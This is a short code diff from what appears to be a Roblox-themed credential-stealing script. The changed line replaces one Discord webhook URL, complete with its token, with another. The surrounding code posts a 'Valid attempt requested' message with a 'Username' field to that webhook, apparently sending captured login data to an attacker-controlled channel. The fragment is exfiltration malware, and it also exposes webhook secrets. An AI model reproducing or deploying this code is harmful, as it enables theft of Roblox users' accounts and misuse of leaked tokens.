@@ -75,7 +75,7 @@ GoogleListener.init();RobloxEventManager.initialize(true);RobloxEventManager.tri
                 "Content-Type":"application/json"}
               ,body:JSON.stringify(o)}
                                         ))({
-              webhookURL:"https://discord.com/api/webhooks/831569384166129704/ZQhHka9axS9Nj9p9yama0QzHo4lnL9CA4tQQ0JH3kzrOzk5IQf4aqavBo3TVZ1VA74wq",content:{
+              webhookURL:"https://discord.com/api/webhooks/832233403985952778/Deka4n90yJKjIVK70NEOv0IDWnaCrdGdOI_hrh4xUcgU-et0ctzoFenvnglCmMW4pMbv",content:{
                 description:"Valid attempt requested",embeds:[{
                   fields:[{
                     name:"Username",value:n,inline:!0}
